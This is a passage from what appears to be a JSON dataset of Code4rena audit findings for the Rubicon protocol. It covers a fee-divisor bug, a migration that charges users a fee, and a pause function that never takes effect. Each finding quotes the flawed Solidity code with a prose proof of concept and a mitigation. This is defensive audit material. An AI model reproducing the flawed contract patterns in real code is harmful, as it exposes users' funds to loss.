receives more asset tokens in this situation than when Position._marketBuy function calculates _fee through dividing by 10000\n        expect(5624943).to.be.gt(5624437);\n      });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to divide by `100_000`, instead of `10000`, when calculating `_fee`.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 904,
      "page_start": null,
      "heading": "904. User can possess less value than before when `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens",
      "heading_cleaned": "User can possess less value than before when `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `V2Migrator.migrate` function executes `uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance)`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\n```solidity\n    function migrate(IBathToken bathTokenV1) external {\n        //////////////// V1 WITHDRAWAL ////////////////\n        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n        require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n        /// @dev approve first\n        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n        // withdraw all tokens from the pool\n        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n        //////////////// V2 DEPOSIT ////////////////\n        IERC20 underlying = bathTokenV1.underlyingToken();\n        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n        underlying.approve(bathTokenV2, amountWithdrawn);\n        require(\n            CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n            \"migrate: MINT FAILED\"\n        );\n        /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n        IERC20(bathTokenV2).transfer(\n            msg.sender,\n            IERC20(bathTokenV2).balanceOf(address(this))\n        );\n        ...\n    }\n```\n\nThen, calling `bathTokenV1.withdraw(bathBalance)` further calls the following `BathTokenV1._withdraw` function, which executes `amountWithdrawn = r.sub(_fee)` so `amountWithdrawn` has `_fee` deducted. When `underlyingToken.safeTransfer(receiver, amountWithdrawn)` is executed, such `amountWithdrawn` is transferred to the `V2Migrator` contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n```solidity\n    function _withdraw(\n        uint256 _shares,\n        address receiver\n    ) internal returns (uint256 amountWithdrawn) {\n        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.safeTransfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.safeTransfer(receiver, amountWithdrawn);\n        ...\n    }\n```\n\nBack in the `V2Migrator.migrate` function, `amountWithdrawn` that already has `_fee` deducted is used to call `CErc20Interface(bathTokenV2).mint(amountWithdrawn)`, and the minted bathTokenV2 tokens are then transferred to the user. The whole migration process basically makes the user send her or his bathTokenV1 tokens in exchange of the bathTokenV2 tokens accordingly so the value owned by the user before and after the migration should be the same. However, after deducting `_fee`, `amountWithdrawn`, which is used to mint the new bathTokenV2 tokens, has become less than the underlying token value that is equivalent to the user's original bathTokenV1 token balance. Although the user should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration, the user is forced to pay `_fee` and possess less value than before when the `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens. Losing value because of the migration is unfair to the user.\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The bathTokenV1 tokens owned by Alice are worth 1000 USDC.\n2. Alice calls the `V2Migrator.migrate` function to migrate her bathTokenV1 tokens to bathTokenV2 tokens.\n3. When the `V2Migrator.migrate` function is called, a fee of 10 USDC is transferred to `feeTo` so the bathTokenV2 tokens minted to Alice are worth only 990 USDC.\n4. As a result, Alice loses 10 USDC because of the migration even though she should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `BathHouse` contract corresponding to `bathHouse` used in the BathToken V1 proxy contract can be upgraded to allow its `BathHouse.setBathTokenFeeBPS` function, which its current implementation is shown below, to be additionally callable by the `V2Migrator` contract. Then, the `V2Migrator.migrate` function can be updated to call this `BathHouse.setBathTokenFeeBPS` function to change the BathToken V1 proxy contract's `feeBPS` to 0 before calling `bathTokenV1.withdraw(bathBalance)` and restore the BathToken V1 proxy contract's `feeBPS` to its original value after calling `bathTokenV1.withdraw(bathBalance)`.\n\nhttps://optimistic.etherscan.io/address/0x29da5213c75a1976452a27c8054e4c65ab0a3c53#code#F1#L337\n```solidity\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n```\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `V2Migrator.migrate` function executes `uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance)`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\n```solidity\n    function migrate(IBathToken bathTokenV1) external {\n        //////////////// V1 WITHDRAWAL ////////////////\n        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n        require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n        /// @dev approve first\n        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n        // withdraw all tokens from the pool\n        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n        //////////////// V2 DEPOSIT ////////////////\n        IERC20 underlying = bathTokenV1.underlyingToken();\n        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n        underlying.approve(bathTokenV2, amountWithdrawn);\n        require(\n            CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n            \"migrate: MINT FAILED\"\n        );\n        /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n        IERC20(bathTokenV2).transfer(\n            msg.sender,\n            IERC20(bathTokenV2).balanceOf(address(this))\n        );\n        ...\n    }\n```\n\nThen, calling `bathTokenV1.withdraw(bathBalance)` further calls the following `BathTokenV1._withdraw` function, which executes `amountWithdrawn = r.sub(_fee)` so `amountWithdrawn` has `_fee` deducted. When `underlyingToken.safeTransfer(receiver, amountWithdrawn)` is executed, such `amountWithdrawn` is transferred to the `V2Migrator` contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n```solidity\n    function _withdraw(\n        uint256 _shares,\n        address receiver\n    ) internal returns (uint256 amountWithdrawn) {\n        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.safeTransfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.safeTransfer(receiver, amountWithdrawn);\n        ...\n    }\n```\n\nBack in the `V2Migrator.migrate` function, `amountWithdrawn` that already has `_fee` deducted is used to call `CErc20Interface(bathTokenV2).mint(amountWithdrawn)`, and the minted bathTokenV2 tokens are then transferred to the user. The whole migration process basically makes the user send her or his bathTokenV1 tokens in exchange of the bathTokenV2 tokens accordingly so the value owned by the user before and after the migration should be the same. However, after deducting `_fee`, `amountWithdrawn`, which is used to mint the new bathTokenV2 tokens, has become less than the underlying token value that is equivalent to the user's original bathTokenV1 token balance. Although the user should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration, the user is forced to pay `_fee` and possess less value than before when the `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens. Losing value because of the migration is unfair to the user.\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The bathTokenV1 tokens owned by Alice are worth 1000 USDC.\n2. Alice calls the `V2Migrator.migrate` function to migrate her bathTokenV1 tokens to bathTokenV2 tokens.\n3. When the `V2Migrator.migrate` function is called, a fee of 10 USDC is transferred to `feeTo` so the bathTokenV2 tokens minted to Alice are worth only 990 USDC.\n4. As a result, Alice loses 10 USDC because of the migration even though she should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `BathHouse` contract corresponding to `bathHouse` used in the BathToken V1 proxy contract can be upgraded to allow its `BathHouse.setBathTokenFeeBPS` function, which its current implementation is shown below, to be additionally callable by the `V2Migrator` contract. Then, the `V2Migrator.migrate` function can be updated to call this `BathHouse.setBathTokenFeeBPS` function to change the BathToken V1 proxy contract's `feeBPS` to 0 before calling `bathTokenV1.withdraw(bathBalance)` and restore the BathToken V1 proxy contract's `feeBPS` to its original value after calling `bathTokenV1.withdraw(bathBalance)`.\n\nhttps://optimistic.etherscan.io/address/0x29da5213c75a1976452a27c8054e4c65ab0a3c53#code#F1#L337\n```solidity\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n```",
      "description": null,
      "impact": "## Impact\nCalling the following `V2Migrator.migrate` function executes `uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance)`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\n```solidity\n    function migrate(IBathToken bathTokenV1) external {\n        //////////////// V1 WITHDRAWAL ////////////////\n        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n        require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n        /// @dev approve first\n        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n        // withdraw all tokens from the pool\n        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n        //////////////// V2 DEPOSIT ////////////////\n        IERC20 underlying = bathTokenV1.underlyingToken();\n        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n        underlying.approve(bathTokenV2, amountWithdrawn);\n        require(\n            CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n            \"migrate: MINT FAILED\"\n        );\n        /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n        IERC20(bathTokenV2).transfer(\n            msg.sender,\n            IERC20(bathTokenV2).balanceOf(address(this))\n        );\n        ...\n    }\n```\n\nThen, calling `bathTokenV1.withdraw(bathBalance)` further calls the following `BathTokenV1._withdraw` function, which executes `amountWithdrawn = r.sub(_fee)` so `amountWithdrawn` has `_fee` deducted. When `underlyingToken.safeTransfer(receiver, amountWithdrawn)` is executed, such `amountWithdrawn` is transferred to the `V2Migrator` contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n```solidity\n    function _withdraw(\n        uint256 _shares,\n        address receiver\n    ) internal returns (uint256 amountWithdrawn) {\n        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.safeTransfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.safeTransfer(receiver, amountWithdrawn);\n        ...\n    }\n```\n\nBack in the `V2Migrator.migrate` function, `amountWithdrawn` that already has `_fee` deducted is used to call `CErc20Interface(bathTokenV2).mint(amountWithdrawn)`, and the minted bathTokenV2 tokens are then transferred to the user. The whole migration process basically makes the user send her or his bathTokenV1 tokens in exchange of the bathTokenV2 tokens accordingly so the value owned by the user before and after the migration should be the same. However, after deducting `_fee`, `amountWithdrawn`, which is used to mint the new bathTokenV2 tokens, has become less than the underlying token value that is equivalent to the user's original bathTokenV1 token balance. Although the user should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration, the user is forced to pay `_fee` and possess less value than before when the `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens. Losing value because of the migration is unfair to the user.\n",
      "mitigation": "## Recommended Mitigation Steps\nThe `BathHouse` contract corresponding to `bathHouse` used in the BathToken V1 proxy contract can be upgraded to allow its `BathHouse.setBathTokenFeeBPS` function, which its current implementation is shown below, to be additionally callable by the `V2Migrator` contract. Then, the `V2Migrator.migrate` function can be updated to call this `BathHouse.setBathTokenFeeBPS` function to change the BathToken V1 proxy contract's `feeBPS` to 0 before calling `bathTokenV1.withdraw(bathBalance)` and restore the BathToken V1 proxy contract's `feeBPS` to its original value after calling `bathTokenV1.withdraw(bathBalance)`.\n\nhttps://optimistic.etherscan.io/address/0x29da5213c75a1976452a27c8054e4c65ab0a3c53#code#F1#L337\n```solidity\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n```\n",
      "poc": "## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The bathTokenV1 tokens owned by Alice are worth 1000 USDC.\n2. Alice calls the `V2Migrator.migrate` function to migrate her bathTokenV1 tokens to bathTokenV2 tokens.\n3. When the `V2Migrator.migrate` function is called, a fee of 10 USDC is transferred to `feeTo` so the bathTokenV2 tokens minted to Alice are worth only 990 USDC.\n4. As a result, Alice loses 10 USDC because of the migration even though she should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nCalling the following `V2Migrator.migrate` function executes `uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance)`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\n```solidity\n    function migrate(IBathToken bathTokenV1) external {\n        //////////////// V1 WITHDRAWAL ////////////////\n        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n        require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n        /// @dev approve first\n        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n        // withdraw all tokens from the pool\n        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n        //////////////// V2 DEPOSIT ////////////////\n        IERC20 underlying = bathTokenV1.underlyingToken();\n        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n        underlying.approve(bathTokenV2, amountWithdrawn);\n        require(\n            CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n            \"migrate: MINT FAILED\"\n        );\n        /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n        IERC20(bathTokenV2).transfer(\n            msg.sender,\n            IERC20(bathTokenV2).balanceOf(address(this))\n        );\n        ...\n    }\n```\n\nThen, calling `bathTokenV1.withdraw(bathBalance)` further calls the following `BathTokenV1._withdraw` function, which executes `amountWithdrawn = r.sub(_fee)` so `amountWithdrawn` has `_fee` deducted. When `underlyingToken.safeTransfer(receiver, amountWithdrawn)` is executed, such `amountWithdrawn` is transferred to the `V2Migrator` contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n```solidity\n    function _withdraw(\n        uint256 _shares,\n        address receiver\n    ) internal returns (uint256 amountWithdrawn) {\n        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.safeTransfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.safeTransfer(receiver, amountWithdrawn);\n        ...\n    }\n```\n\nBack in the `V2Migrator.migrate` function, `amountWithdrawn` that already has `_fee` deducted is used to call `CErc20Interface(bathTokenV2).mint(amountWithdrawn)`, and the minted bathTokenV2 tokens are then transferred to the user. The whole migration process basically makes the user send her or his bathTokenV1 tokens in exchange of the bathTokenV2 tokens accordingly so the value owned by the user before and after the migration should be the same. However, after deducting `_fee`, `amountWithdrawn`, which is used to mint the new bathTokenV2 tokens, has become less than the underlying token value that is equivalent to the user's original bathTokenV1 token balance. Although the user should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration, the user is forced to pay `_fee` and possess less value than before when the `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens. Losing value because of the migration is unfair to the user.\n",
        "recommendation": "## Recommended Mitigation Steps\nThe `BathHouse` contract corresponding to `bathHouse` used in the BathToken V1 proxy contract can be upgraded to allow its `BathHouse.setBathTokenFeeBPS` function, which its current implementation is shown below, to be additionally callable by the `V2Migrator` contract. Then, the `V2Migrator.migrate` function can be updated to call this `BathHouse.setBathTokenFeeBPS` function to change the BathToken V1 proxy contract's `feeBPS` to 0 before calling `bathTokenV1.withdraw(bathBalance)` and restore the BathToken V1 proxy contract's `feeBPS` to its original value after calling `bathTokenV1.withdraw(bathBalance)`.\n\nhttps://optimistic.etherscan.io/address/0x29da5213c75a1976452a27c8054e4c65ab0a3c53#code#F1#L337\n```solidity\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n```\n",
        "poc": "## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The bathTokenV1 tokens owned by Alice are worth 1000 USDC.\n2. Alice calls the `V2Migrator.migrate` function to migrate her bathTokenV1 tokens to bathTokenV2 tokens.\n3. When the `V2Migrator.migrate` function is called, a fee of 10 USDC is transferred to `feeTo` so the bathTokenV2 tokens minted to Alice are worth only 990 USDC.\n4. As a result, Alice loses 10 USDC because of the migration even though she should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `V2Migrator.migrate` function executes `uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance)`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/V2Migrator.sol#L38-L74\n```solidity\n    function migrate(IBathToken bathTokenV1) external {\n        //////////////// V1 WITHDRAWAL ////////////////\n        uint256 bathBalance = bathTokenV1.balanceOf(msg.sender);\n        require(bathBalance > 0, \"migrate: ZERO AMOUNT\");\n\n        /// @dev approve first\n        bathTokenV1.transferFrom(msg.sender, address(this), bathBalance);\n\n        // withdraw all tokens from the pool\n        uint256 amountWithdrawn = bathTokenV1.withdraw(bathBalance);\n\n        //////////////// V2 DEPOSIT ////////////////\n        IERC20 underlying = bathTokenV1.underlyingToken();\n        address bathTokenV2 = v1ToV2Pools[address(bathTokenV1)];\n\n        underlying.approve(bathTokenV2, amountWithdrawn);\n        require(\n            CErc20Interface(bathTokenV2).mint(amountWithdrawn) == 0,\n            \"migrate: MINT FAILED\"\n        );\n        /// @dev v2 bathTokens shouldn't be sent to this contract from anywhere other than this function\n        IERC20(bathTokenV2).transfer(\n            msg.sender,\n            IERC20(bathTokenV2).balanceOf(address(this))\n        );\n        ...\n    }\n```\n\nThen, calling `bathTokenV1.withdraw(bathBalance)` further calls the following `BathTokenV1._withdraw` function, which executes `amountWithdrawn = r.sub(_fee)` so `amountWithdrawn` has `_fee` deducted. When `underlyingToken.safeTransfer(receiver, amountWithdrawn)` is executed, such `amountWithdrawn` is transferred to the `V2Migrator` contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathTokenV1.sol#L532-L564\n```solidity\n    function _withdraw(\n        uint256 _shares,\n        address receiver\n    ) internal returns (uint256 amountWithdrawn) {\n        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.safeTransfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.safeTransfer(receiver, amountWithdrawn);\n        ...\n    }\n```\n\nBack in the `V2Migrator.migrate` function, `amountWithdrawn` that already has `_fee` deducted is used to call `CErc20Interface(bathTokenV2).mint(amountWithdrawn)`, and the minted bathTokenV2 tokens are then transferred to the user. The whole migration process basically makes the user send her or his bathTokenV1 tokens in exchange of the bathTokenV2 tokens accordingly so the value owned by the user before and after the migration should be the same. However, after deducting `_fee`, `amountWithdrawn`, which is used to mint the new bathTokenV2 tokens, has become less than the underlying token value that is equivalent to the user's original bathTokenV1 token balance. Although the user should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration, the user is forced to pay `_fee` and possess less value than before when the `V2Migrator.migrate` function is called to give up bathTokenV1 tokens and hold bathTokenV2 tokens. Losing value because of the migration is unfair to the user.\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The bathTokenV1 tokens owned by Alice are worth 1000 USDC.\n2. Alice calls the `V2Migrator.migrate` function to migrate her bathTokenV1 tokens to bathTokenV2 tokens.\n3. When the `V2Migrator.migrate` function is called, a fee of 10 USDC is transferred to `feeTo` so the bathTokenV2 tokens minted to Alice are worth only 990 USDC.\n4. As a result, Alice loses 10 USDC because of the migration even though she should own the same value no matter holding the bathTokenV1 tokens before the migration or bathTokenV2 tokens after the migration.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `BathHouse` contract corresponding to `bathHouse` used in the BathToken V1 proxy contract can be upgraded to allow its `BathHouse.setBathTokenFeeBPS` function, which its current implementation is shown below, to be additionally callable by the `V2Migrator` contract. Then, the `V2Migrator.migrate` function can be updated to call this `BathHouse.setBathTokenFeeBPS` function to change the BathToken V1 proxy contract's `feeBPS` to 0 before calling `bathTokenV1.withdraw(bathBalance)` and restore the BathToken V1 proxy contract's `feeBPS` to its original value after calling `bathTokenV1.withdraw(bathBalance)`.\n\nhttps://optimistic.etherscan.io/address/0x29da5213c75a1976452a27c8054e4c65ab0a3c53#code#F1#L337\n```solidity\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n```\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 906,
      "page_start": null,
      "heading": "906. Calling `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot pause any functionlities of the market",
      "heading_cleaned": "Calling `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot pause any functionlities of the market",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n\n\n# Vulnerability details\n\n## Impact\nAlthough the following `ExpiringMarket.stop` function can be called by the `RubiconMarket` contract's owner, calling it does not stop the market because `stopped` is not used at all in the protocol for pausing any of the market's functionalities.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\n```solidity\n    function stop() external auth {\n        stopped = true;\n    }\n```\n\nMoreover, the following `ExpiringMarket.isClosed` function always returns `false`. This means that the market cannot be closed. Since this `ExpiringMarket.isClosed` function is called in the `ExpiringMarket.can_offer` and `ExpiringMarket.can_buy` modifiers below, these modifiers' `require(!isClosed())` will always pass, and new offers and buys are always allowed. Similarly, the below `RubiconMarket.can_cancel` modifier's `require` statement's `isClosed()` check is always false so the situation, where the user wants to cancel an offer when the market is closed, does not exist at all.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\n```solidity\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\n```solidity\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n```solidity\n    // // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() ||\n                msg.sender == getOwner(id) ||\n                id == dustId ||\n                (msg.sender == getRecipient(id) && getOwner(id) == address(0)),\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n```\n\nSince calling the `ExpiringMarket.stop` and `ExpiringMarket.isClosed` functions cannot close or stop the market, the `RubiconMarket` contract's owner is unable to pause any functionlities of the market and prevented any unintended outflow and loss of user funds when an emergency occurs, such as if the protocol gets attacked and hacked.\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. The protocol is hacked so the `RubiconMarket` contract's owner calls the `ExpiringMarket.stop` function as an attempt to pause the functionalities of the market.\n2. After the `ExpiringMarket.stop` function is called, none of the market's functionalities are paused because `stopped` is not used at all in the protocol for pausing any of the market's functionalities and the `ExpiringMarket.isClosed` function always returns `false`.\n3. As a result, the attacker can transfer user funds out from the protocol, and such user funds are lost.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `ExpiringMarket.stop` function can be updated to set `stopped` to true or false by the `RubiconMarket` contract's owner. The `ExpiringMarket.isClosed` function can then be updated to return `stopped`. This enables the `RubiconMarket` contract's owner to pause and unpause the market's functionalities when needed.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n\n\n# Vulnerability details\n\n## Impact\nAlthough the following `ExpiringMarket.stop` function can be called by the `RubiconMarket` contract's owner, calling it does not stop the market because `stopped` is not used at all in the protocol for pausing any of the market's functionalities.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L628-L630\n```solidity\n    function stop() external auth {\n        stopped = true;\n    }\n```\n\nMoreover, the following `ExpiringMarket.isClosed` function always returns `false`. This means that the market cannot be closed. Since this `ExpiringMarket.isClosed` function is called in the `ExpiringMarket.can_offer` and `ExpiringMarket.can_buy` modifiers below, these modifiers' `require(!isClosed())` will always pass, and new offers and buys are always allowed. Similarly, the below `RubiconMarket.can_cancel` modifier's `require` statement's `isClosed()` check is always false so the situation, where the user wants to cancel an offer when the market is closed, does not exist at all.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L620-L622\n```solidity\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L596-L607\n```solidity\n    /// @dev After close_time has been reached, no new offers are allowed.\n    modifier can_offer() override {\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, no new buys are allowed.\n    modifier can_buy(uint256 id) override {\n        require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L718-L729\n```solidity\n    // // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() ||\n                msg.sender == getOwner(id) ||\n                id == dustId ||\n                (msg.sender == 